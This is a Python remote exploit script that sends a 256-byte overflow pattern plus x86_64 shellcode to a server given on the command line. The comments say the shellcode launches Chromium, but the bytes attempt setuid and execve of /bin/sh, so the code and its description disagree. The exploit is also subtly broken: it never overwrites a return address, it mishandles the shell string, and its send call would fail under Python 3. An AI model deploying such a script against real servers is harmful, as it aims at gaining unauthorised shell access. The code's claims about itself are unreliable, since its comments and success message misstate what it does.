import socket
import sys
import struct


# Buffer size for payload
BUF_SIZE = 256

# Overflow pattern to identify the offset
overflow_pattern = "A" * 256  # Adjust the buffer size if needed

# Shellcode to execute Chromium browser
# This shellcode is specific to the target architecture (x86_64)
# Replace this with your actual shellcode
shellcode = (
    "\x48\x31\xc0"                          # xor    %rax,%rax
    "\x48\x83\xc0\x69"                      # add    $0x69,%rax
    "\x48\x31\xff"                          # xor    %rdi,%rdi
    "\x57"                                  # push   %rdi
    "\x57"                                  # push   %rdi
    "\x48\x89\xe6"                          # mov    %rsp,%rsi
    "\x0f\x05"                              # syscall
    "\x48\x31\xc0"                          # xor    %rax,%rax
    "\x48\x83\xc0\x3b"                      # add    $0x3b,%rax
    "\x48\x31\xd2"                          # xor    %rdx,%rdx
    "\x48\xbe\x2f\x62\x69\x6e\x2f\x73\x68"  # movabs $0x68732f6e69622f,%rsi
    "\x48\xc1\xee\x08"                      # shr    $0x8,%rsi
    "\x53"                                  # push   %rbx
    "\x48\x89\xe7"                          # mov    %rsp,%rdi
    "\x57"                                  # push   %rdi
    "\x48\x89\xe6"                          # mov    %rsp,%rsi
    "\x0f\x05"                              # syscall
)

# Function to craft the payload
def craft_payload():
    offset = BUF_SIZE  # Offset to overwrite the return address
    payload = overflow_pattern[:offset]  # Fill the buffer with overflow pattern
    payload += shellcode  # Append the shellcode
    return payload

# Function to exploit the vulnerability
def exploit(server_ip, server_port):
    # Create a socket object
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        # Connect to the server
        s.connect((server_ip, server_port))
        
        # Craft the payload
        payload = craft_payload()
        
        # Send the payload to the server
        print("[*] Sending payload to server...")
        s.send(payload)
        
        print("[+] Payload sent successfully! Chromium should be launched on the target machine.")

    except Exception as e:
        print("[-] An error occurred:", e)
    
    finally:
        # Close the socket connection
        s.close()

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python exploit.py <server_ip> <server_port>")
        sys.exit(1)
    
    server_ip = sys.argv[1]
    server_port = int(sys.argv[2])
    exploit(server_ip, server_port)
